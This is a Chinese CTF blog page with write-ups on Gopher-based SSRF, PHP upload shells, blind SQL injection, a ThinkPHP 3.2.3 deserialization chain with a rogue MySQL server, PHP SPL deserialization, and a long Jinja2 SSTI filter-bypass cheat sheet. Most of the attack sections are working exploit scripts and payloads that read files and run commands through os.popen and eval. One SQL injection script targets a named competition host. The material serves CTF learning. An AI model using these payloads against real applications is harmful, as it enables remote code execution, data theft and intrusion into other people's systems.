            <h3 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h3><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它。</p>
<pre><code>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议。</code></pre>
<p>Gopher协议格式</p>
<pre><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code></pre>
<pre><code>–wite-curlwrappers：运用curl工具打开url流
curl使用curl --version查看版本以及支持的协议</code></pre>
<p><img src="/images/71.png"></p>
<p>Gopher发送请求HTTP GET请求：</p>
<p>使用Gopher协议发送一个请求，环境为：nc起一个监听，curl发送gopher请求</p>
<p>nc启动监听，监听2333端口：nc -lvp 2333</p>
<p>使用curl发送http请求，命令为</p>
<pre><code>root@kali ~# curl gopher://192.168.17.129:2333/abcd</code></pre>
<p>此时nc收到的消息为：</p>
<pre><code>root@Ubuntu ~# nc -lp 2333
bcd</code></pre>
<p>可以发现url中的a没有被nc接受到，如果命令变为</p>
<pre><code>root@kali ~# curl gopher://192.168.17.129:2333/_abcd</code></pre>
<p>此时nc收到的消息为：</p>
<pre><code>root@Ubuntu ~# nc -lp 2333
abcd</code></pre>
<p>在Gopher协议中发送HTTP的数据，需要注意的是</p>
<pre><code>1、问号（？）需要转码为URL编码，也就是%3f
2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a
3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）
可以直接利用Hackbar进行编码，然后把%0a换行修改为%0d%0a即可。</code></pre>
<p>GET数据包</p>
<pre><code>GET /ssrf.php?name=c0tfl0g HTTP/1.1
Host: 192.168.17.1</code></pre>
<p>编码后</p>
<pre><code>GET%20/ssrf.php%3fname=c0tfl0g%20HTTP/1.1%0d%0AHost:%20192.168.17.1%0d%0A</code></pre>
<p><img src="/images/72.png"></p>
<p>POST数据包（必须要包含最基本的4个信息）</p>
<pre><code>POST /ssrf.php HTTP/1.1
host:192.168.17.1
Content-Type:application/x-www-form-urlencoded
Content-Length:12

name=c0tfl0g</code></pre>
<p>编码后</p>
<pre><code>POST%20/ssrf.php%20HTTP/1.1%0d%0AHost:192.168.17.1%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:12%0d%0A%0d%0Aname=c0tfl0g%0d%0A</code></pre>
<p><img src="/images/73.png"></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45089570/article/details/109643457">文章一</a></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/04/04/%E7%BA%A2%E6%98%8E%E8%B0%B7%E9%83%A8%E5%88%86wp/">
                红明谷部分wp
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-04-04</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h3 id="write-shell"><a href="#write-shell" class="headerlink" title="write_shell"></a>write_shell</h3><p><img src="/images/70.png"></p>
<p>payload</p>
<p>短标签绕过</p>
<pre><code>&lt;?=?&gt;  等价于  &lt;? echo ?&gt;
空格绕过 这里很多都可以绕过，注意转义！如\$IFS\$1
?action=upload&amp;data=&lt;?=`cat%09/!wahtyouwant401*`?&gt;</code></pre>
<p>payload</p>
<pre><code>file_put_contents可以传入数组
?action=upload&amp;data[]=&lt;?ph&amp;data[]=p%0Aph&amp;data[]=pinfo()%0A?&gt;</code></pre>
<h3 id="happysql"><a href="#happysql" class="headerlink" title="happysql"></a>happysql</h3><p>注入点在登录处</p>
<p>过滤了等号可以用in，regexp代替，空格可以用/**/等方法绕过，information可以用mysql.innodb_table_stats绕过爆出库和表</p>
<p>大佬的exp</p>
<pre><code>from binascii import *
import requests

ascii_str = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;&#39;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&quot;
url = &#39;http://eci-2ze6jljai3r43tjxt13k.cloudeci1.ichunqiu.com/login.php&#39;

headers = &#123;&#39;Host&#39;: &#39;eci-2ze6jljai3r43tjxt13k.cloudeci1.ichunqiu.com/&#39;,
               &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0&#39;,
               &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39;,
               &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,
               &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#39;,
               &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;&#125;

text = &#39;&#39;
for i in range(1,50):
    for s in ascii_str:
        username = &#39;1&quot;||hex(left((select/**/*/**/from/**/ctf.f1ag),&#123;&#125;))in(&quot;&#123;&#125;&quot;)#&#39;.format(i,hexlify((text+s).encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;).upper())
        payload = &#123;&quot;username&quot;: username,&quot;password&quot;: &quot;mochu7&quot;&#125;
        res = requests.post(url=url,headers=headers,data=payload)
        if &#39;home.php&#39; in res.text:
            text += s
            print(text)
</code></pre>
<pre><code>1&quot;||hex(left(version(),&#123;&#125;))in(&quot;&#123;&#125;&quot;)#

1&quot;||hex(left((select/**/group_concat(database_name)/**/from/**/mysql.innodb_table_stats),&#123;&#125;))in(&quot;&#123;&#125;&quot;)#

1&quot;||hex(left((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/(database_name)in(database())),&#123;&#125;))in(&quot;&#123;&#125;&quot;)#

1&quot;||hex(left((select/**/*/**/from/**/ctf.f1ag),&#123;&#125;))in(&quot;&#123;&#125;&quot;)#</code></pre>
<p>本地sql靶场测试的exp</p>
<pre><code>import binascii
import requests
rq = requests.session()
url = &quot;http://127.0.0.1/Less-2/?id=-1||hex(left((select/**/database()),&#123;&#125;))in(&#39;&#123;&#125;&#39;)--+&quot;
flag = &#39;&#39;
ascii_str =&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;&#39;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&quot;
for i in range(1,30):
    for j in ascii_str:
        rp = rq.get(url.format(i,binascii.b2a_hex(flag+j)))
        if &quot;Dumb&quot; in rp.text:
            flag += j
            print(flag)</code></pre>
<pre><code>import requests
import string
rq = requests.session()
url = &quot;http://127.0.0.1/Less-2/?id=-1||locate(binary&#39;&#123;&#125;&#39;,(select/**/database()))in(&#123;&#125;)--+&quot;
flag = &#39;&#39;
ascii_str = string.printable
for i in range(1,30):
    for j in ascii_str:
        rp = rq.get(url.format(j,i))
        if &quot;Dumb&quot; in rp.text:
            flag += j
            print(flag)</code></pre>
<pre><code>binary 可以用来区分大小写
locate(a,b) a在b第一次出现的位置</code></pre>
<h3 id="easytp"><a href="#easytp" class="headerlink" title="easytp"></a>easytp</h3><p>考察的是（tp3.2.3反序列化进行任意文件读取，SQL注入）</p>
<p><strong>注意搭建环境时的php版本选择5.多的</strong></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA">tp3.2.3反序列化参考文章</a></p>
<p>可以自己在本地下载tp3.2.3进行验证。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/allyshka/Rogue-MySql-Server/">架设恶意mysql服务脚本</a></p>
<p>由于mysql客户端绝对信任服务端。导致攻击机可以构造一个恶意服务端，在连接的时候发送读取文件的请求，然后返回的结果会被记录到mysql.log</p>
<p>exp</p>
<pre><code>&lt;?php
namespace Think\Db\Driver&#123;
    use PDO;
    class Mysql&#123;
        protected $options = array(
            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true    // 开启才能读取文件
        );
        protected $config = array(
            &quot;debug&quot;    =&gt; 1,
            &quot;database&quot; =&gt; &quot;&quot;,
            &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;,
            &quot;hostport&quot; =&gt; &quot;3307&quot;,
            &quot;charset&quot;  =&gt; &quot;utf8&quot;,
            &quot;username&quot; =&gt; &quot;root&quot;,
            &quot;password&quot; =&gt; &quot;&quot;
        );
    &#125;
&#125;

namespace Think\Image\Driver&#123;
    use Think\Session\Driver\Memcache;
    class Imagick&#123;
        private $img;

        public function __construct()&#123;
            $this-&gt;img = new Memcache();
        &#125;
    &#125;
&#125;

namespace Think\Session\Driver&#123;
    use Think\Model;
    class Memcache&#123;
        protected $handle;

        public function __construct()&#123;
            $this-&gt;handle = new Model();
        &#125;
    &#125;
&#125;

namespace Think&#123;
    use Think\Db\Driver\Mysql;
    class Model&#123;
        protected $options   = array();
        protected $pk;
        protected $data = array();
        protected $db = null;

        public function __construct()&#123;
            $this-&gt;db = new Mysql();
            $this-&gt;options[&#39;where&#39;] = &#39;&#39;;
            $this-&gt;pk = &#39;id&#39;;
            $this-&gt;data[$this-&gt;pk] = array(
                &quot;table&quot; =&gt; &quot;mysql.user where 1=updatexml(1,user(),1)#&quot;,
                &quot;where&quot; =&gt; &quot;1=1&quot;
            );
        &#125;
    &#125;
&#125;

namespace &#123;
    echo base64_encode(serialize(new Think\Image\Driver\Imagick()));
&#125;</code></pre>
<p>参考文章：</p>
<p><a target="_blank" rel="noopener" href="https://mochu.blog.csdn.net/article/details/115410705">https://mochu.blog.csdn.net/article/details/115410705</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU1MTkwMTY1NQ==&mid=2247489306&idx=1&sn=9bbbf8f0df5f1f3df9eb75ae89191969&chksm=fb8b17a2ccfc9eb46aaee123dc9cee324651f256f066669bab0cf2db177798482d6241839dc3&xtrack=1&scene=90&subscene=93&sessionid=1617467772&clicktime=1617467775&enterid=1617467775&ascene=56&devicetype=android-29&version=2800023b&nettype=cmnet&abtest_cookie=AAACAA==&lang=en&exportkey=AWQ1imExH4RDcHkdVG1vGfM=&pass_ticket=mDbyZRyUjptMeAN0jfo3+ovzcy0k2ISLV6ClVlWqxNdd1F4ha7aQX9gbqKC/C+oJ&wx_header=1">文章二</a></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/29/dasctf%E9%83%A8%E5%88%86wp/">
                dasctf部分wp
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-29</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h3 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h3><p>源码</p>
<pre><code></code></pre>
<p>PHP标准库</p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/book.spl.php">https://www.php.net/manual/zh/book.spl.php</a></p>
<p>SLP类中存在能够进行文件处理和迭代的类：</p>
<table>
<thead>
<tr>
<th>类</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>DirectoryIterator</td>
<td>遍历目录</td>
</tr>
<tr>
<td>FilesystemIterator</td>
<td>遍历目录</td>
</tr>
<tr>
<td>GlobIterator</td>
<td>遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag*</td>
</tr>
<tr>
<td>SplFileObject</td>
<td>读取文件，按行读取，多行需要遍历</td>
</tr>
</tbody></table>
<p>exp</p>
<p>直接读取/var/www/html下面的文件</p>
<pre><code>&lt;?php
class A&#123;
    public $class=&#39;FilesystemIterator&#39;;
    public $para=&quot;/var/www/html&quot;;
    public $check;
    &#125;
$a  = new A();
echo serialize($a);</code></pre>
<pre><code>&lt;?php
class A&#123;
    public $class=&#39;SplFileObject&#39;;
    public $para=&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;;
    public $check;
    &#125;

$a  = new A();
echo serialize($a);</code></pre>
<h3 id="baby-flask"><a href="#baby-flask" class="headerlink" title="baby_flask"></a>baby_flask</h3><p>黑名单</p>
<pre><code>blacklist&lt;/br&gt;   
&#39;.&#39;,&#39;[&#39;,&#39;\&#39;&#39;,&#39;&quot;&#39;,&#39;&#39;\\&#39;,&#39;+&#39;,&#39;:&#39;,&#39;_&#39;,&lt;/br&gt;   
&#39;chr&#39;,&#39;pop&#39;,&#39;class&#39;,&#39;base&#39;,&#39;mro&#39;,&#39;init&#39;,&#39;globals&#39;,&#39;get&#39;,&lt;/br&gt;   
&#39;eval&#39;,&#39;exec&#39;,&#39;os&#39;,&#39;popen&#39;,&#39;open&#39;,&#39;read&#39;,&lt;/br&gt;   
&#39;select&#39;,&#39;url_for&#39;,&#39;get_flashed_messages&#39;,&#39;config&#39;,&#39;request&#39;,&lt;/br&gt;   
&#39;count&#39;,&#39;length&#39;,&#39;０&#39;,&#39;１&#39;,&#39;２&#39;,&#39;３&#39;,&#39;４&#39;,&#39;５&#39;,&#39;６&#39;,&#39;７&#39;,&#39;８&#39;,&#39;９&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;&lt;/br&gt;   
&lt;/br&gt;</code></pre>
<p>可以看到几乎都过滤了</p>
<p>config过滤了可以用lipsum获取数字（当然也可以用其他的）</p>
<p><img src="/images/64.png"></p>
<p>利用index 返回了 1</p>
<p><img src="/images/65.png"></p>
<p>因为过滤了引号，所以可以利用join过滤器来绕过</p>
<p><img src="/images/66.png"></p>
<p>点 .  []  也被过滤了，利用 attr 和 pop获取 _</p>
<pre><code>&#123;% set id=dict(ind=a,ex=a)|join%&#125;
&#123;% set pp=dict(po=a,p=a)|join%&#125;
&#123;% set nn=dict(n=a)|join%&#125;
&#123;% set tt=dict(t=a)|join%&#125;
&#123;% set ff=dict(f=a)|join%&#125;
&#123;% set five=(lipsum|string|list)|attr(id)(tt) %&#125;
&#123;% set three=(lipsum|string|list)|attr(id)(nn) %&#125;
&#123;% set one=(lipsum|string|list)|attr(id)(ff) %&#125;
&#123;% set shiba=five*five-three-three-one %&#125;
&#123;% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %&#125;
&#123;&#123;xiahuaxian&#125;&#125;
相当于
(lipsum|string|list)[18] &lt;=&gt; (lipsum|string|list).pop(18)</code></pre>
<p><img src="/images/67.png"></p>
<p>最终payload</p>
<pre><code>1&#123;% set id=dict(ind=a,ex=a)|join%&#125;
&#123;% set pp=dict(po=a,p=a)|join%&#125;
&#123;% set ls=dict(ls=a)|join%&#125;
&#123;% set ppe=dict(po=a,pen=a)|join%&#125;
&#123;% set gt=dict(ge=a,t=a)|join%&#125;
&#123;% set cr=dict(ch=a,r=a)|join%&#125;
&#123;% set nn=dict(n=a)|join%&#125;
&#123;% set tt=dict(t=a)|join%&#125;
&#123;% set ff=dict(f=a)|join%&#125;
&#123;% set ooqq=dict(o=a,s=a)|join %&#125;
&#123;% set rd=dict(re=a,ad=a)|join%&#125;
&#123;% set five=(lipsum|string|list)|attr(id)(tt) %&#125;
&#123;% set three=(lipsum|string|list)|attr(id)(nn) %&#125;
&#123;% set one=(lipsum|string|list)|attr(id)(ff) %&#125;
&#123;% set shiba=five*five-three-three-one %&#125;
&#123;% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %&#125;
&#123;% set gb=(xiahuaxian,xiahuaxian,dict(glob=a,als=a)|join,xiahuaxian,xiahuaxian)|join %&#125;
&#123;% set bin=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join %&#125;
&#123;% set chcr=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;
&#123;% set xiegang=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%&#125;
&#123;% set space=chcr(three*three*five-five-five-three) %&#125;
&#123;% set shell=(ls,space,xiegang,dict(var=a)|join,xiegang,dict(www=a)|join,xiegang,dict(flask=a)|join)|join %&#125;
&#123;&#123;(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()&#125;&#125;
</code></pre>
<p><strong>方法2</strong></p>
<p>python3支持unicode编码</p>
<pre><code>测试的使用&#123;%print 𝟡%&#125;如果可以正常回显就代表支持</code></pre>
<p>参考文章</p>
<p><a target="_blank" rel="noopener" href="http://www.plasf.cn/articles/dasctf202103.html">http://www.plasf.cn/articles/dasctf202103.html</a></p>
<p>这个网站有各种各样的unicode编码方式</p>
<p><a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/bidiclass/EN">https://www.compart.com/en/unicode/bidiclass/EN</a></p>
<p><img src="/images/68.png"></p>
<p><img src="/images/69.png"></p>
<pre><code>&#123;%set a=dict(po=aa,p=aa)|join%&#125; # pop
&#123;%set b=lipsum|string|list|attr(a)(𝟙𝟠)%&#125; # _
&#123;%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%&#125; # globals
&#123;%set d=(b,b,dict(ge=cc,tit=dd,em=aa)|join,b,b)|join%&#125; # getitem
&#123;%set e=dict(o=cc,s=aa)|join%&#125; # os
&#123;%set f=lipsum|string|list|attr(a)(𝟡)%&#125; # 空格
&#123;%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟠)%&#125; # 斜杠
&#123;%set i=(dict(cat=aa)|join,f,g,dict(flag=aa)|join)|join%&#125; # cat /flag
&#123;%set h=(a,dict(en=aa)|join|join)|join%&#125; # popen
&#123;%set i=dict(re=aa,ad=aa)|join%&#125; # read
&#123;%set z=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟝)%&#125; #点
&#123;%set j=(dict(ls=aa)|join,f,g,(dict(var=aa)|join),g,(dict(www=aa)|join),g,(dict(flask=aa)|join)|join)|join%&#125; #ls /var/www/flask
&#123;%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%&#125;&#123;&#123;j&#125;&#125;
#最后拼接起来
#&#123;&#123;lipsum.__globals__['os'].popen('ls /var/www/flask').read()&#125;&#125;</code></pre>
<p><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/2.11.x/templates/">jinja2官方文档</a></p>
<pre><code>&#123;%%&#125;可以用来声明变量，当然也可以用于循环语句和条件语句。
&#123;&#123;&#125;&#125;用于将表达式打印到模板输出
&#123;##&#125;表示未包含在模板输出中的注释
##可以有和&#123;%%&#125;相同的效果</code></pre>
<pre><code>&#123;% set x= 'abcd' %&#125;  声明变量
&#123;% for i in ['a','b','c'] %&#125;&#123;&#123;i&#125;&#125;&#123;%endfor%&#125; 循环语句
&#123;% if 25==5*5 %&#125;&#123;&#123;1&#125;&#125;&#123;% endif %&#125;  条件语句</code></pre>
<p><strong>[BJDCTF 2nd]fake google</strong>用来复现的地方（在buu平台）</p>
<pre><code>__class__            类的一个内置属性，表示实例对象的类。
__base__             类型对象的直接基类
__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.
__init__             初始化类，返回的类型是function
__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#39;b&#39;]，就是a.__getitem__(&#39;b&#39;)
__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()]
__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app。
get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app。
lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__['os'].popen('ls').read()&#125;&#125;
current_app          应用上下文，一个全局变量。

request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/proc\self\fd/3&#39;).read()
request.args.x1        get传参
request.values.x1      所有参数
request.cookies      cookies参数
request.headers      请求头参数
request.form.x1        post传参    (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data           post传参    (Content-Type:a/b)
request.json         post传json  (Content-Type: application/json)
config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__['os'].popen('ls').read() &#125;&#125;
g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#39;flask_ssti&#39;&gt;</code></pre>
<p>常用的过滤器</p>
<pre><code>
int()：将值转换为int类型；

float()：将值转换为float类型；

lower()：将字符串转换为小写；

upper()：将字符串转换为大写；

title()：把值中的每个单词的首字母都转成大写；

capitalize()：把变量值的首字母转成大写，其余字母转小写；

trim()：截取字符串前面和后面的空白字符；

wordcount()：计算一个长字符串中单词的个数；

reverse()：字符串反转；

replace(value,old,new)： 替换将old替换为new的字符串；

truncate(value,length=255,killwords=False)：截取length长度的字符串；

striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；

escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。

safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;'<em>hello</em>'|safe&#125;&#125;；

list()：将变量列成列表；

string()：将变量转换成字符串；

join()：将一个序列中的参数值拼接成字符串。示例看上面payload；

abs()：返回一个数值的绝对值；

first()：返回一个序列的第一个元素；

last()：返回一个序列的最后一个元素；

format(value,arags,*kwargs)：格式化字符串。比如：&#123;&#123; "%s" - "%s"|format('Hello?',"Foo!") &#125;&#125;将输出：Helloo? - Foo!

length()：返回一个序列或者字典的长度；

sum()：返回列表内数值的和；

sort()：返回排序后的列表；

default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#39;xiaotuo&#39;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。

length()返回字符串的长度，别名是count</code></pre>
<p>比如查看一下os._wrap_close类所处空间下可使用的module,方法和变量,利用.keys()爆出这个dict的所有键名</p>
<pre><code>print(&#39;&#39;.__class__.__bases__[0].__subclasses__()[139].__init__.__globals__.keys())</code></pre>
<p>一下注入点均是name</p>
<p>#0x01</p>
<p>用以下已有的函数，去得到builtins，然后用eval就可以了</p>
<pre><code>&#123;&#123;url_for.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></pre>
<p>#0x02</p>
<p>另一种姿势去得到builtins</p>
<pre><code>&#123;&#123;x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></pre>
<p>这里的x任意26个英文字母的任意组合都可以，同样可以得到<code>__builtins__</code>然后用eval就可以了。</p>
<p>#0x03</p>
<p>学习一下用<code>&#123;% %&#125;</code>来SSTI</p>
<pre><code>&#123;% for i in ''.__class__.__mro__[1].__subclasses__() %&#125;&#123;% if i.__name__=='_wrap_close' %&#125;&#123;% print i.__init__.__globals__['popen']('ls').read() %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre>
<p>#0x04</p>
<p>因为我们没法直接使用chr函数，所以需要通过<code>__builtins__</code>找到他</p>
<pre><code>?name=&#123;%set chr=url_for.__globals__.__builtins__.chr%&#125;&#123;%print url_for.__globals__[chr(111)%2bchr(115)].popen(chr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()%&#125;</code></pre>
<p>#0x05</p>
<p>过滤了单双引号，可以用request来绕过</p>
<p>get</p>
<pre><code>?a=os&amp;b=popen&amp;c=cat /flag&amp;name=&#123;&#123;url_for.__globals__[request.args.a][request.args.b](request.args.c).read()&#125;&#125;</code></pre>
<p>post</p>
<pre><code>?name=&#123;&#123;url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()&#125;&#125;
cookie:a=os;b=popen;c=cat /flag</code></pre>
<p>当然还可以使用cookie绕过。看上面！</p>
<p>#0x06</p>
<p>字符串拼接，这里用config拿到字符串</p>
<pre><code>?name=&#123;&#123;url_for.__globals__[(config.__str__()[2])%2B(config.__str__()[42])]&#125;&#125;
等价于
?name=&#123;&#123;url_for.__globals__['os']&#125;&#125;</code></pre>
<p>#0x07</p>
<p>过滤了[，用点绕过或__getitem，或pop</p>
<pre><code>?name=&#123;&#123;url_for.__globals__.__builtins__.eval("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></pre>
<pre><code>&#123;&#123;''.__class__.__mro__.__getitem__(1).__subclasses__().pop(117).__init__.__globals__.popen('ls').read()&#125;&#125;</code></pre>
<p>使用request绕过的话可以这样</p>
<pre><code>?name=&#123;&#123;url_for.__globals__.os.popen(request.cookies.c).read()&#125;&#125;
Cookie:c=cat /flag</code></pre>
<p>#0x08</p>
<p>点  .  和 [ 都被ban了 ，用attr()绕过 </p>
<p>！！有点小问题</p>
<pre><code>&#123;&#123;()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(177)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("dir").read()')&#125;&#125;</code></pre>
<p>#0x09  16进制绕过</p>
<pre><code>&quot;__class__&quot;==&quot;\x5f\x5fclass\x5f\x5f&quot;==&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;
对于python2的话，还可以利用base64进行绕过
&quot;__class__&quot;==(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;)</code></pre>
<pre><code>&#123;%print(
()|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f") 
//__class__

|attr("\x5f\x5f\x62\x61\x73\x65\x5f\x5f")      
//__base__

|attr("\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f")()
//__subclasses__

|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")(202)   
//__getitem__

|attr("\x5f\x5f\x69\x6e\x69\x74\x5f\x5f")  
//__init__

|attr("\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f") 
//__globals__

|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")("\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f")
//__getitem__('__builtins')

|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")("\x65\x76\x61\x6c") 
//__getitem__('eval')

("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74\x27\x29\x2e\x72\x65\x61\x64\x28\x29")
//("__import__('os').popen('cat flag.txt').read()")
)%&#125;</code></pre>
<p>#0x0A</p>
<p>在jinja2里面可以利用~进行拼接</p>
<pre><code>&#123;% set a='__cla' %&#125;&#123;% set b='ss__'%&#125;&#123;%print( ''[a~b])%&#125;</code></pre>
<p>#0x0B</p>
<p>大小写转换</p>
<p>前提是过滤的只是小写</p>
<pre><code>&#123;&#123;''["__CLASS__".lower()]&#125;&#125;</code></pre>
<p>#0x0C</p>
<p>拼接</p>
<pre><code>&quot;cla&quot;+&quot;ss&quot;</code></pre>
<p>反转</p>
<pre><code>&quot;__ssalc__&quot;[::-1]</code></pre>
<pre><code>&quot;&quot;[&quot;__cla&quot;&quot;ss__&quot;]
&quot;&quot;.__getattribute__(&quot;__cla&quot;&quot;ss__&quot;)
&quot;&quot;[&quot;__ssalc__&quot;[::-1]]
&quot;&quot;.__getattribute__(&quot;__ssalc__&quot;[::-1])</code></pre>
<p>#0x0D</p>
<p>除了第一个其他几个我测的时候会出错。不知道为啥！！</p>
<pre><code>&#123;&#123;url_for.__globals__['__builtins__']&#125;&#125;
&#123;&#123;url_for.__globals__.__getitem__('__builtins__')&#125;&#125;
&#123;&#123;url_for.__globals__.pop('__builtins__')&#125;&#125;
&#123;&#123;url_for.__globals__.get('__builtins__')&#125;&#125;
&#123;&#123;url_for.__globals__.setdefault('__builtins__')&#125;&#125;</code></pre>
<p><strong>过滤器</strong></p>
<pre><code>Variables can be modified by filters. Filters are separated from the variable by a pipe symbol (|) and may 
have optional arguments in parentheses. Multiple filters can be chained. The output of one filter is 
applied to the next.
